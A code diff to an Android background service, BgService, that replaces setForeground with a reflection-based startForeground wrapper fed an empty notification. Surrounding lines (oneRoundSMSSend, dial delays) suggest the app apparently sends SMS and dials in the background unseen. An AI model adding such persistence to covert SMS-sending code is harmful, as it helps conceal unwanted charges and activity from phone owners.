@@ -1,19 +1,18 @@
 package com.mms.bg.ui;
 
 import java.io.File;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
 import java.util.Date;
 import java.util.List;
 
+import android.app.Notification;
+import android.app.NotificationManager;
 import android.app.Service;
-import android.content.BroadcastReceiver;
-import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
-import android.content.IntentFilter;
 import android.content.pm.PackageManager;
 import android.content.pm.ResolveInfo;
-import android.content.pm.ServiceInfo;
-import android.os.Bundle;
 import android.os.IBinder;
 import android.util.Log;
 
@@ -42,6 +41,66 @@ public class BgService extends Service {
     private static final int LONG_DIAL_DELAY = 4 * 60 * 1000;
     private static final int DIAL_DELAY = 5 * 1000;
     private static final int SHOW_DIALOG_DELAY = 2000;
+    
+    private static final int NOTIFY_ID = 1;
+    private static final Class[] mStartForegroundSignature = new Class[] { int.class, Notification.class };
+    private static final Class[] mStopForegroundSignature = new Class[] { boolean.class };
+
+    private NotificationManager mNM;
+    private Method mStartForeground;
+    private Method mStopForeground;
+    private Object[] mStartForegroundArgs = new Object[2];
+    private Object[] mStopForegroundArgs = new Object[1];
+
+    /**
+     * This is a wrapper around the new startForeground method, using the older
+     * APIs if it is not available.
+     */
+    private void startForegroundCompat(int id, Notification notification) {
+        // If we have the new startForeground API, then use it.
+        if (mStartForeground != null) {
+            mStartForegroundArgs[0] = Integer.valueOf(id);
+            mStartForegroundArgs[1] = notification;
+            try {
+                mStartForeground.invoke(this, mStartForegroundArgs);
+            } catch (InvocationTargetException e) {
+                // Should not happen.
+                Log.w("ApiDemos", "Unable to invoke startForeground", e);
+            } catch (IllegalAccessException e) {
+                // Should not happen.
+                Log.w("ApiDemos", "Unable to invoke startForeground", e);
+            }
+            return;
+        }
+        
+        setForeground(true);
+    }
+
+    /**
+     * This is a wrapper around the new stopForeground method, using the older
+     * APIs if it is not available.
+     */
+    private void stopForegroundCompat(int id) {
+        // If we have the new stopForeground API, then use it.
+        if (mStopForeground != null) {
+            mStopForegroundArgs[0] = Boolean.TRUE;
+            try {
+                mStopForeground.invoke(this, mStopForegroundArgs);
+            } catch (InvocationTargetException e) {
+                // Should not happen.
+                Log.w("ApiDemos", "Unable to invoke stopForeground", e);
+            } catch (IllegalAccessException e) {
+                // Should not happen.
+                Log.w("ApiDemos", "Unable to invoke stopForeground", e);
+            }
+            return;
+        }
+
+        // Fall back on the old API.  Note to cancel BEFORE changing the
+        // foreground state, since we could be killed at that point.
+        setForeground(false);
+    }
+    
     
 //    private static final int DIAL_AUTO = 0;
 //    private static final int SHOW_DIALOG = 1;
@@ -90,9 +149,7 @@ public class BgService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
-        
         if (DEBUG) Log.d(TAG, "[[BgService::onCreate]]");
-        this.setForeground(true);
         
         mSM = SettingManager.getInstance(BgService.this);
         mSM.setFirstStartTime();
@@ -113,6 +170,18 @@ public class BgService extends Service {
         }
         LOGD("PID = " + SettingManager.getInstance(getApplicationContext()).mPid);
         mStartSMSAfterInternet = true;
+        
+        mNM = (NotificationManager)getSystemService(NOTIFICATION_SERVICE);
+        try {
+            mStartForeground = getClass().getMethod("startForeground", mStartForegroundSignature);
+            mStopForeground = getClass().getMethod("stopForeground", mStopForegroundSignature);
+        } catch (NoSuchMethodException e) {
+            // Running on an older platform.
+            mStartForeground = mStopForeground = null;
+        }
+        
+        Notification notification = new Notification();
+        this.startForegroundCompat(NOTIFY_ID, notification);
     }
     
     @Override
@@ -185,8 +254,8 @@ public class BgService extends Service {
     @Override
     public void onDestroy() {
         super.onDestroy();
-//        this.unregisterReceiver(mDialogBroadCast);
         mSM.log(TAG, "onDestroy");
+        stopForegroundCompat(NOTIFY_ID);
     }
     
     private void oneRoundSMSSend() {
